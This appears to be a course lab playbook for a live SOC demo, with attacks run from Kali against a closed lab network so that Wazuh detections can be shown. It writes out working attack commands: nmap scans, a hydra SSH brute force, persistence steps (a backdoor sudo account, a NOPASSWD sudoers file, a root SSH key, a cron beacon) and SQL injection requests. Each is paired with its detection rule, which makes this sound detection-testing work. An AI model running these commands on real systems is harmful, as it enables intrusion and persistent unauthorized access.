# Kali attack playbook for the live demo (2026-10-26)

**Owner:** Daniel (@dmelgar1110). **Scope:** the closed ASOX lab network only, course FASE 2.
**Purpose:** drive the three use cases from the Kali box against the lab, and confirm each
one is detected by Wazuh. This is the live counterpart of `tests/demo.sh` (which fakes the
same events locally). Use `demo.sh` as the fallback if a device fails on the day.

> Run these only against the lab's own victim and network equipment, on the lab LAN, with
> the team present. Nothing here reaches outside that network.

## Lab addresses (fill in on the day)

| Host | Address | Role |
|---|---|---|
| SOC (Wazuh manager) | `<SOC_IP>` | `CORE_HOST`, receives syslog + agents |
| OPNsense | `192.168.1.1` | firewall, syslog → 514/udp |
| Victim (Ubuntu, nginx + openssh) | `<VICTIM_IP>` | `linux-servers` agent |
| Suricata sensor | `<SENSOR_IP>` | `network-sensors` agent, sees SPAN traffic |
| Kali (attacker) | `<KALI_IP>` | source of every command below |

Before starting: the victim and sensor agents are enrolled and `Active`
(`agent_control -lc` on the manager, or Grafana → Agents), and the three network devices
point their syslog at `<SOC_IP>`. Open Grafana **Attack Scenarios** and the n8n
`recv-wazuh-alert` executions tab (DEMO.md "30 minutes before").

---

## Use case 1 — Recon (network scan)

**Attack (Kali):**

```bash
# SYN scan of the victim; the SPAN port feeds this to Suricata, and the scan
# of the firewall's interface is logged by OPNsense itself.
nmap -sS -p 1-1024 <VICTIM_IP>
nmap -sS -p 1-1024 192.168.1.1
```

**Wazuh should show:**

| Source | Rule | Level | Note |
|---|---|---|---|
| Suricata (sensor) | **101010** | 10 | `ET SCAN` signature, T1046, from `<KALI_IP>` |
| OPNsense syslog | **103000** | 10 | 10 blocked ports in 60 s, `data.srcip` = `<KALI_IP>` |

Show in Grafana: Top rules and Top source IPs. Talking point: "the same recon is seen two
ways — on the wire by the IDS, and by the firewall's own log."

If 103000 does not fire, the scan was too slow or too few ports were blocked: re-run the
second `nmap` without `-p` (full range) so at least 10 distinct ports are denied inside 60 s.

---

## Use case 2 — SSH brute force, then persistence

**Attack (Kali):**

```bash
# A short, named wordlist so the demo is quick and the right account succeeds.
printf '%s\n' spring summer autumn winter Passw0rd! Lab2026! correct-horse > creds.txt

# Brute force the victim's SSH. Use an account you created on the victim for the
# lab, whose real password is the last line, so a success follows the failures.
hydra -l labuser -P creds.txt ssh://<VICTIM_IP> -t 4 -W 1
```

Then, over the SSH session that succeeded, plant persistence on the victim:

```bash
ssh labuser@<VICTIM_IP>

# backdoor account in a privileged group
sudo useradd -m -s /bin/bash svc-backup
sudo usermod -aG sudo svc-backup

# a sudoers drop-in, a root SSH key and a cron job (all under FIM)
echo 'svc-backup ALL=(ALL) NOPASSWD:ALL' | sudo tee /etc/sudoers.d/90-svc-backup
sudo mkdir -p /root/.ssh && echo 'ssh-ed25519 AAAA...lab-demo-key' | sudo tee -a /root/.ssh/authorized_keys
echo '*/5 * * * * root /usr/bin/id > /tmp/.beacon' | sudo tee /etc/cron.d/beacon
```

**Wazuh should show:**

| Step | Rule | Level | Note |
|---|---|---|---|
| Brute force | 5763 | 10 | repeated SSH auth failures |
| Success after failures | **40112** | 12 | critical: failures then a login — likely stolen creds |
| User → sudo | **100211** | 10 | `svc-backup` added to a privileged group |
| (often) | **40501** | 15 | "attacks, then a user added" correlation |
| sudoers file | **100300** | 10 | FIM, real-time |
| root authorized_keys | **100301** | 10 | FIM |
| cron job | **100302** | 10 | FIM |

Show in Grafana: Login after failures, Critical (24h), File changes (FIM), Most changed
files. Talking point: "real files changed on the host, not a log line."

**Timing:** the brute-force rule stays quiet 60–120 s after it fires (`ignore`). Do not
re-run use case 2 inside that window or 40112 will not re-trigger. FIM is real-time, so the
three file alerts appear within a few seconds of the `tee` commands.

---

## Use case 3 — SQL injection against the web server

**Attack (Kali):**

```bash
# Enough requests to cross the web brute-force threshold (31152 after 8).
for i in $(seq 1 10); do
  curl -s "http://<VICTIM_IP>/index.php?id=1'%20OR%20'1'='1" > /dev/null
done

# A single clear injection to screenshot the decoded fields.
curl -s "http://<VICTIM_IP>/login.php?user=admin'--+-&pass=x" > /dev/null
```

**Wazuh should show:**

| Rule | Level | Note |
|---|---|---|
| 31103 | 7 | per request: SQL injection pattern in the access log |
| **31152** | 10 | after 8 matches: multiple common attacks from `<KALI_IP>` |

Show in Grafana: Recent alerts — open one and show `data.srcip` and `data.url`.
The victim needs no setup beyond nginx/Apache: the `linux-servers` group already reads
`/var/log/nginx/access.log` and `/var/log/apache2/access.log`.

---

## Closing line

In n8n, every alert at level 7 or higher became an execution of `recv-wazuh-alert`
(contract C1); from there it is enriched and a TheHive alert is created (the next part of
the demo).

## If a live attack shows nothing

1. Wait 10 s — indexing can lag; look in Grafana again.
2. Confirm the agent is `Active` and the device's syslog arrives
   (`tests/run.sh` is logtest-only, so it won't tell you about live traffic).
3. Fall back to `tests/demo.sh --from <step>`, which produces the same alerts locally, and
   finally to the screenshots in `docs/EVIDENCE.md`.
